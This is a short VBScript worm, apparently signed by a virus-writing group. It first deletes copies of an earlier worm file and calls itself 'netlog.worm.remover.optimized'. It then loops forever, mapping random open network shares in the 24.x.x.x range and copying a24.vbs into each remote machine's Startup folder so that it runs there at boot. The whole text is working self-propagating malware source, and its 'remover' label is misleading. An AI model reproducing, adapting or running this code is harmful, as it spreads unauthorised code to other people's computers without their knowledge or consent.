set t=wscript.createobject("wscript.network")
set f=createobject("scripting.filesystemobject")
on error resume next
randomize
if (f.fileexists("c:\network.vbs")) then f.deletefile("c:\network.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\network.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\network.vbs")
do
do while w=0
n="\\24."&int(254*rnd+1)&"."&int(254*rnd+1)&"."&int(254*rnd+1)&"\C"
t.mapnetworkdrive "x:",n
set o=t.enumnetworkdrives
for i=0 to o.Count-1
if n=o.item(i) then w=1
next
loop
f.copyfile "c:\windows\startm~1\programs\startup\a24.vbs", "x:\windows\startm~1\programs\startup\"
t.removenetworkdrive "x:"
w=0
loop
'netlog.worm.remover.optimized
'That's how the normal code should look like...
'Greetings to BSRF.